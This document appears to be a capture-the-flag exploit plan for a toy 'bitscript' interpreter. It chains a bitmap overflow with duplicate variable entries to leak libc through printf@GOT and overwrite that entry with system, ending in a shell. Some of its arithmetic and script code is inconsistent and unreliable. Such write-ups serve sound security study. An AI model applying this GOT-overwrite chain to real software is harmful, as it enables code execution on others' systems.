# Combined Exploit: Bitmap Overflow + Duplicate Variable Declaration

## Overview

This document explains how to combine the **bitmap overflow vulnerability** with the **duplicate variable declaration vulnerability** to achieve more powerful exploitation, potentially leading to RCE.

## Understanding the Components

### 1. Variable Table Structure

Each variable entry is **64 bytes (0x40)** with the following layout:

```
Offset 0x00-0x1F (0-31):  Variable name (32 bytes, null-terminated)
Offset 0x20 (32):         Type (int32: 0=int, 1=string, 2=bitmap)
Offset 0x28 (40):         Value pointer (QWORD) - points to runtime value
Offset 0x30 (48):         Previous pointer (QWORD) - linked list prev
Offset 0x38 (56):        Next pointer (QWORD) - linked list next
```

### 2. get_variable Function Behavior

```c
__int64 __fastcall get_variable(const char *a1)
{
  current = var_table_head;  // Start from head
  while (current) {
    if (strcmp(current->name, a1) == 0) {
      return current;  // Returns FIRST match
    }
    current = current->next;  // Follow next pointer
  }
  return 0;  // Not found
}
```

**Key Point:** `get_variable` follows the `next` pointer to traverse the linked list. If we can corrupt this pointer, we can redirect it to any entry!

### 3. Duplicate Variable Creates Multiple Entries

When we declare the same variable twice:
```bitscript
int x = 1;
int x = 2;
```

**Result:**
- Entry #1: `name="x"`, `value=1`, `next=Entry#2`
- Entry #2: `name="x"`, `value=undefined`, `next=...`
- `get_variable("x")` returns Entry #1 (first match)

### 4. Bitmap Overflow for Arbitrary Write

With `create(9223372036854775807, 2)`:
- `width = INT64_MAX`
- `data_buffer` is tiny (malloc(0))
- `set(b1, x, y, value)` can write to **ANY address**

**Calculation:**
```
target_addr = bitmap_data_ptr + (y * INT64_MAX + x) / 8
```

## The Combined Exploit Strategy

### Goal: Corrupt Variable Table Linked List to Redirect get_variable

### Step 1: Create Duplicate Variables

```bitscript
int target = 0x12345678;        // Entry #1: target variable
int target = 0x87654321;       // Entry #2: leaked entry (we'll corrupt this)
int victim = 0x11111111;        // Entry #3: victim variable
```

**Variable Table State:**
```
[Entry #1: name="target", value=0x12345678, next=Entry#2]
  ↓
[Entry #2: name="target", value=0x87654321, next=Entry#3] ← TARGET FOR CORRUPTION
  ↓
[Entry #3: name="victim", value=0x11111111, next=...]
```

### Step 2: Calculate Address of Entry #2

We need to know where Entry #2 is in memory. Options:

**Option A: Use OOB Read**
- Use bitmap overflow to read variable table entries
- Find Entry #2's address by reading from Entry #1's `next` pointer

**Option B: Heap Grooming**
- Control heap layout to predict Entry #2's address
- Use string allocations to position entries predictably

**Option C: Leak from Entry #1**
- If we can read Entry #1's `next` pointer, we get Entry #2's address
- Use bitmap overflow to read from Entry #1's memory location

### Step 3: Corrupt Entry #2's `next` Pointer

**Target:** Entry #2's `next` pointer (offset 0x38 = 56 bytes from Entry #2 start)

**Goal:** Point Entry #2's `next` to a controlled location (e.g., `printf@GOT`)

**Using Bitmap Overflow:**
```bitscript
bitmap b1 = create(9223372036854775807, 2);

// Calculate y value to hit Entry #2's next pointer
// entry2_addr + 56 = target_addr
// bitmap_data_ptr + (y * INT64_MAX + x) / 8 = entry2_addr + 56
// y = ((entry2_addr + 56 - bitmap_data_ptr) * 8) / INT64_MAX

// Write printf@GOT address (0x409048) to Entry #2's next pointer
// We need to write 64 bits (8 bytes) bit by bit
set(b1, x, calculated_y, 1);  // Write bits to construct 0x409048
```

### Step 4: Corrupt Entry #1's `next` Pointer

**Alternative Approach:** Instead of corrupting Entry #2, corrupt Entry #1's `next` pointer to point directly to `printf@GOT`.

**Why This Works:**
- Entry #1 is the one returned by `get_variable("target")`
- If we corrupt Entry #1's `next` to point to `printf@GOT`, then:
  - `get_variable("target")` returns Entry #1 (normal)
  - But if we can make `get_variable` follow `next`, it would go to `printf@GOT`
  - However, `get_variable` doesn't follow `next` after finding a match...

**Wait, that won't work directly. Let me reconsider...**

### Better Approach: Corrupt Entry #1's Name

**Idea:** Corrupt Entry #1's name to match a different variable, then create a new entry with the original name that points to GOT.

**Step-by-Step:**
1. Create duplicate: `int x = 1; int x = 2;`
2. Entry #1: `name="x"`, Entry #2: `name="x"` (leaked)
3. Corrupt Entry #1's name to `"y"` (using bitmap overflow)
4. Now `get_variable("x")` will return Entry #2 (first match with name "x")
5. Corrupt Entry #2's `value_ptr` to point to `printf@GOT`
6. When we read `x`, we get the value from `printf@GOT` → **libc leak!**

### Even Better: Direct value_ptr Corruption

**Simplest Approach:**
1. Create duplicate: `int leak = 0; int leak = 0;`
2. Entry #1: `name="leak"`, `value_ptr=0` (active)
3. Entry #2: `name="leak"`, `value_ptr=0` (leaked)
4. Use bitmap overflow to corrupt Entry #1's `value_ptr` (offset 0x28) to point to `printf@GOT`
5. Read `leak` → `get_variable("leak")` returns Entry #1
6. Entry #1's `value_ptr` now points to `printf@GOT`
7. When interpreter reads `leak`, it reads from `printf@GOT` → **libc address leaked!**

## Detailed Exploit Flow

### Phase 1: Setup

```bitscript
// Create duplicate variable for corruption target
int leak = 0;           // Entry #1: will be corrupted
int leak = 0;          // Entry #2: leaked (not used)

// Create bitmap for arbitrary write
bitmap b1 = create(9223372036854775807, 2);
```

### Phase 2: Find Entry #1 Address

**Challenge:** We need to know where Entry #1 is in memory.

**Solution Options:**

**A. Use OOB Read from Bitmap:**
- Read from bitmap buffer (y=0) to find heap metadata
- Follow pointers to find variable table entries
- Identify Entry #1 by its name "leak"

**B. Use Heap Grooming:**
- Allocate variables in predictable order
- Calculate Entry #1's address based on heap layout
- Requires knowledge of malloc behavior

**C. Use Variable Table Head Pointer:**
- `var_table_head` is a global variable
- If we can read it (via OOB read or other leak), we get Entry #1's address
- Global variables are at fixed addresses (No PIE)

### Phase 3: Calculate Bitmap Write Coordinates

**To write to Entry #1's `value_ptr` (offset 0x28):**

```
target_addr = entry1_addr + 0x28
bitmap_data_ptr + (y * INT64_MAX + x) / 8 = target_addr

y = ((target_addr - bitmap_data_ptr) * 8) / INT64_MAX
x = ((target_addr - bitmap_data_ptr) * 8) % 8
```

**Problem:** We need `bitmap_data_ptr` (heap address) and `entry1_addr` (heap address).

**Solution:** Use OOB read to find these addresses, or use heap grooming.

### Phase 4: Write printf@GOT Address to value_ptr

**We need to write 8 bytes (64 bits) representing `printf@GOT` address (0x409048).**

**Using bitmap `set()`:**
- `set()` only writes 1 bit at a time
- We need to write 64 bits to construct the full address
- For each bit position (0-63), calculate if bit is set, then call `set(b1, x, y, 1)`

**Example for 0x409048:**
```
0x409048 = 0b010000001001000001001000
           (in binary, 64 bits: ...00000000010000001001000001001000)
```

**Write each bit:**
```bitscript
// Bit 0: 0 (don't set)
// Bit 1: 0 (don't set)
// Bit 2: 0 (don't set)
// Bit 3: 1 (set)
// ... (continue for all 64 bits)
```

### Phase 5: Read Leaked Address

```bitscript
int leaked = leak;  // Reads from printf@GOT via corrupted value_ptr
print(leaked);      // Prints libc's printf address
```

### Phase 6: Calculate system Address

```bitscript
// leaked = printf address in libc
// system_addr = leaked - printf_offset + system_offset
// (Need libc offsets from readelf)
```

### Phase 7: Write system to GOT

```bitscript
// Corrupt printf@GOT to point to system
// Use bitmap overflow to write system address to 0x409048
```

### Phase 8: Trigger RCE

```bitscript
print("/bin/sh");  // Calls printf, but printf@GOT points to system
// → system("/bin/sh") → shell!
```

## Challenges and Solutions

### Challenge 1: Finding Addresses

**Problem:** Need `bitmap_data_ptr` and `entry1_addr` (both heap addresses).

**Solutions:**
1. **OOB Read:** Use bitmap overflow to read heap metadata
2. **Heap Grooming:** Control allocations to predict addresses
3. **Global Variables:** Read `var_table_head` if accessible
4. **Brute Force:** Try common heap addresses (if ASLR disabled for heap)

### Challenge 2: Bit-by-Bit Write

**Problem:** `set()` only writes 1 bit, need to write 64 bits.

**Solution:** Write a loop in bitscript to set each bit:
```bitscript
int addr = 0x409048;  // Target address
int bitpos = 0;
while (bitpos < 64) {
    int bit = (addr >> bitpos) & 1;
    if (bit != 0) {
        set(b1, x_offset + bitpos, y, 1);
    }
    bitpos = bitpos + 1;
}
```

**Wait, bitscript doesn't have bitwise operations!**

**Alternative:** Pre-calculate all bit positions and write them manually, or use arithmetic to determine bit values.

### Challenge 3: Alignment

**Problem:** `set()` writes to bit position `(y * INT64_MAX + x) % 8` within a byte.

**Solution:** Calculate `x` and `y` carefully to align with target address.

## Simplified Exploit Path

Given the challenges, a **simpler approach** might be:

1. **Use string overflow** to corrupt variable table (already working)
2. **Use bitmap overflow** to write to GOT directly (if we can calculate addresses)
3. **Skip variable corruption** if we can write to GOT directly

But the **variable corruption approach** is valuable because:
- Variables are on the heap (easier to reach than GOT)
- We can use byte-level operations (assignment) instead of bit-level
- More reliable than trying to write bits to GOT

## Conclusion

The combination of duplicate variable declaration + bitmap overflow allows us to:
1. **Create predictable variable table entries** (duplicate declaration)
2. **Corrupt variable entries** (bitmap overflow)
3. **Redirect value_ptr** to GOT or other targets
4. **Achieve arbitrary read/write** through variable operations
5. **Leak libc addresses** and achieve RCE

This is a **powerful exploitation technique** that leverages both vulnerabilities together!

